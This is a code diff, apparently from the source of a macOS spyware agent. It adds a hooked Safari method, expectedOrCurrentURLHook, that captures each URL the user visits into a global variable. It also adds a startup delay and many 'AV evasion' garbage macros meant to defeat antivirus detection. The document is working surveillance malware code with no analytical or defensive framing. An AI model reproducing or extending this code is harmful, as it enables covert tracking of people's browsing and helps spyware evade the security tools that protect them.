@@ -445,6 +445,8 @@ void URLStartAgent()
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   NSTimeInterval interval;
   
+  sleep(2);
+  
   // AV evasion: only on release build
   AV_GARBAGE_001
   
@@ -912,6 +914,56 @@ void URLStartAgent()
   AV_GARBAGE_001
   
   [pool release];
+}
+
+
+/*
+ * Hook for Safari 7.x
+ */
+
+- (id)expectedOrCurrentURLHook
+{
+  id __url = nil;
+  
+  if ([self respondsToSelector:@selector(expectedOrCurrentURLHook)])
+  {
+    __url = [self expectedOrCurrentURLHook];
+  }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+  if (__url != nil)
+  {
+    // AV evasion: only on release build
+    AV_GARBAGE_006
+    
+    @synchronized((id)&gLastURl)
+    {
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
+      if (gLastURl != nil)
+        [gLastURl release];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
+      gLastURl = [[NSString alloc] initWithString:[((NSURL*)__url) absoluteString]];
+    }
+  }
+
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  [pool release];
+  
+  return __url;
 }
 
 /*
